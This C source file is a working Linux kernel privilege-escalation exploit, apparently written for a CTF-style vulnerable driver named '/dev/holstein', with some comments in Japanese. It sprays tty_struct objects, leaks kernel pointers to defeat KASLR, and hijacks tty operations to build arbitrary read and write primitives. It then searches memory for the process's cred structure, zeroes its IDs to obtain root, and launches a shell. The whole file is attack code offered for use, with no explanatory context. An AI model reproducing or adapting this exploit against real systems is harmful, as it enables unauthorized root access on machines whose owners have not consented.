#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>


#define ofs_tty_ops 0xc38880
#define addr_modprobe_path (kbase + 0xe38180)
#define rop_mov_prdx_rcx (kbase + 0x1b7dd6)
#define rop_mov_eax_prdx (kbase + 0x440428)


unsigned long kbase, g_buf;
unsigned long user_cs, user_ss, user_rsp, user_rflags;

void fatal(const char *msg){
    perror(msg);
    exit(1);
}

char buf[0x500];
int spray[100];
int fd;

int cache_fd = -1;

unsigned int AAR32(unsigned long addr) {
    if (cache_fd == -1) {
        unsigned long *p = (unsigned long*)&buf;
        p[12] = rop_mov_eax_prdx;
        *(unsigned long*)&buf[0x418] = g_buf;
        write(fd, buf, 0x420);
    }

    // mov eax, [rdx]; ret;
    if (cache_fd == -1) {
        for (int i = 0; i < 100; i++) {
            int v = ioctl(spray[i], 0, addr /* rdx */);
            if (v != -1) {
                cache_fd = spray[i];
                return v;
            }
        }
    } else {
        return ioctl(cache_fd, 0, addr /* rdx */);
    }
}

void AAW32(unsigned long addr, unsigned int val) {
    unsigned long *p = (unsigned long*)&buf;
    p[12] = rop_mov_prdx_rcx;
    *(unsigned long*)&buf[0x418] = g_buf;
    write(fd, buf, 0x420);

    // mov [rdx], rcx; ret;
    for (int i = 0; i < 100; i++) {
        ioctl(spray[i], val /* rcx */, addr /* rdx */);
    }
}

int main(){

    for (int i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1)
            fatal("/dev/ptmx");
    }

    // 周囲にtty_structがある位置
    fd = open("/dev/holstein", O_RDWR);
    if (fd == -1)
      fatal("/dev/holstein");

    for (int i = 50; i < 100; i++) {
      spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
      if (spray[i] == -1)
        fatal("/dev/ptmx");
    }

    // Bypass KASLR
    read(fd, buf, 0x500);
    kbase = *(unsigned long*)&buf[0x418] - ofs_tty_ops;
    printf("[+] kbase = 0x%016lx\n", kbase);

    // g_bufのアドレスリーク
    // オフセット0x38はtty_structの中を指す
    g_buf = *(unsigned long*)&buf[0x438] - (0x400 + 0x38);
    printf("[+] g_buf = 0x%016lx\n", g_buf);

    // commのアドレスをPR_SET_NAMEから検索
    if (prctl(PR_SET_NAME, "yu1hpaaa") != 0)
        fatal("prctl");
    unsigned long addr;
    for (addr = g_buf - 0x1000000; ; addr += 0x8) {
        if((addr & 0xfffff) == 0)
            printf("searching... 0x%016lx\n", addr);

        // yu1h : 0x68317579
        // paaa : 0x61616170
        if (AAR32(addr) == 0x68317579
            && AAR32(addr+4) == 0x61616170) {
            printf("[+] Found 'comm' at 0x%016lx\n", addr);
            break;
        }
    }

    // 64ビットを2回に分けてcredのアドレスを取得
    unsigned long addr_cred = 0;
    addr_cred |= AAR32(addr - 8);
    addr_cred |= (unsigned long)AAR32(addr - 4) << 32;
    printf("[+] current->cred = 0x%016lx\n", addr_cred);

    for (int i = 1; i < 9; i++) {
        AAW32(addr_cred + i*4, 0); // id=0(root)
    }

    puts("[+] pwned");
    system("/bin/sh");

    close(fd);
    return 0;
}

